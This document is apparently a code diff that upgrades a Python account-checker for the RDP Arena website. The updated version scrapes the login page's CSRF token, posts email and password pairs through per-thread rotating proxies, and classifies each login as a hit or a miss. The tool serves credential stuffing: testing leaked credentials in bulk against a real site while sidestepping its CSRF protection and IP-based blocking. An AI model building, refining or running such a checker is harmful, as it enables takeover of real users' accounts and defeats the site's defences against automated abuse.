@@ -1,16 +1,16 @@
 """
-Checker for RDP Arena – Debug version with better error detection.
+Checker for RDP Arena (www.rdparena.com)
+Handles CSRF token, redirects, and proxy rotation.
 """
+import re
 import requests
 import threading
 from typing import Tuple
 
 BASE_URL = "https://www.rdparena.com/"
-LOGIN_URL = BASE_URL + "payments/login"
+LOGIN_PAGE = BASE_URL + "payments/login"
+LOGIN_POST = BASE_URL + "payments/login"  # same endpoint
 TIMEOUT = 15
-
-# Set to True to see full response body
-DEBUG = True
 
 def check(email: str, password: str) -> Tuple[bool, str]:
     proxy = getattr(threading.current_thread(), 'proxy', None)
@@ -24,69 +24,69 @@ def check(email: str, password: str) -> Tuple[bool, str]:
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
         "Origin": BASE_URL,
-        "Referer": BASE_URL
+        "Referer": LOGIN_PAGE
     })
 
     try:
-        payload = {"email": email, "password": password}
-        response = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT, allow_redirects=False)
+        # Step 1: GET login page to extract CSRF token
+        get_resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
+        if get_resp.status_code != 200:
+            return False, f"Failed to load login page (HTTP {get_resp.status_code})"
 
-        if DEBUG:
-            print(f"[DEBUG] Status: {response.status_code}")
-            print(f"[DEBUG] Headers: {response.headers}")
-            print(f"[DEBUG] Cookies: {session.cookies.get_dict()}")
-            print(f"[DEBUG] Body (full):")
-            print(response.text)   # Print everything
+        # Extract token from hidden input field
+        token_match = re.search(r'<input type="hidden" name="token" value="([^"]+)"', get_resp.text)
+        if not token_match:
+            return False, "CSRF token not found on login page"
+        csrf_token = token_match.group(1)
 
-        # ---------- Success detection ----------
+        # Step 2: POST credentials with token
+        payload = {
+            "username": email,
+            "password": password,
+            "token": csrf_token,
+            "rememberme": "1"   # optional, but may help maintain session
+        }
 
-        # 1. Redirect – success
-        if response.status_code in (301, 302):
-            location = response.headers.get("Location", "")
-            if "login" in location.lower() or "signin" in location.lower():
-                return False, f"Redirected back to login: {location}"
-            return True, f"Login successful (redirect to {location})"
+        # We allow redirects to follow to the final page
+        post_resp = session.post(LOGIN_POST, data=payload, timeout=TIMEOUT, allow_redirects=True)
 
-        # 2. HTTP 200 – inspect content
-        if response.status_code == 200:
-            html = response.text.lower()
-            title = "title" in html and html.split("<title>")[1].split("</title>")[0] if "<title>" in html else ""
+        # Step 3: Determine success
+        final_url = post_resp.url.lower()
+        # If we are redirected to clientarea or dashboard, success
+        if "clientarea" in final_url or "dashboard" in final_url:
+            return True, "Login successful (redirect to client area)"
 
-            # --- Error messages (WHMCS style) ---
-            error_patterns = [
-                "invalid email", "invalid login", "incorrect email", "incorrect login",
-                "authentication failed", "credentials are incorrect", "wrong password",
-                "login failed", "account not found", "inactive account", "your account is suspended"
-            ]
-            has_error = any(pattern in html for pattern in error_patterns)
+        # If the page title is not "Login - RDP Arena", assume we're logged in
+        title_match = re.search(r'<title>(.*?)</title>', post_resp.text, re.IGNORECASE)
+        if title_match:
+            title = title_match.group(1).strip().lower()
+            if "login" not in title:
+                return True, f"Login successful (page title: {title})"
 
-            # --- Success indicators ---
-            success_patterns = ["dashboard", "logout", "welcome", "account", "my account", "profile"]
-            has_success = any(pattern in html for pattern in success_patterns)
+        # Check for explicit error messages (including CSRF errors)
+        html = post_resp.text.lower()
+        error_phrases = [
+            "invalid", "incorrect", "error", "failed", "wrong",
+            "not found", "csrf", "protection token", "invalid token"
+        ]
+        if any(phrase in html for phrase in error_phrases):
+            # Try to find specific error message
+            error_match = re.search(r'<div class="alert alert-danger">(.*?)</div>', post_resp.text, re.IGNORECASE | re.DOTALL)
+            if error_match:
+                error_msg = error_match.group(1).strip()
+                return False, f"Login failed: {error_msg}"
+            return False, "Login failed (error message found)"
 
-            # --- Presence of login form ---
-            has_login_form = 'name="password"' in html or 'type="password"' in html
+        # If we still have a login form, it's likely a failure
+        if 'name="password"' in html or 'type="password"' in html:
+            return False, "Login failed (login form still present)"
 
-            # --- Decision ---
-            if has_success:
-                return True, "Login successful (content marker)"
-            if has_error:
-                return False, "Login failed (error message found)"
-            if has_login_form and not has_success:
-                # Still on login page, but no explicit error – likely a failure
-                return False, "Login failed (login form still present, no success indicator)"
-            # Check for session cookie as a weak indicator
-            if session.cookies.get_dict():
-                # But we already saw that the cookie is set even before login.
-                # So we should only trust this if we also see a success indicator,
-                # but we already checked that. So we can ignore.
-                pass
-            # If we are still here, ambiguous
-            return False, "Login response ambiguous (treated as failure)"
+        # Fallback – if we have a session cookie, maybe success
+        if session.cookies.get_dict():
+            return True, "Login successful (session cookie set)"
 
-        # 3. Other status codes
-        else:
-            return False, f"HTTP {response.status_code}: {response.reason}"
+        # Otherwise ambiguous
+        return False, "Login response ambiguous (treated as failure)"
 
     except requests.exceptions.Timeout:
         return False, "Request timed out"
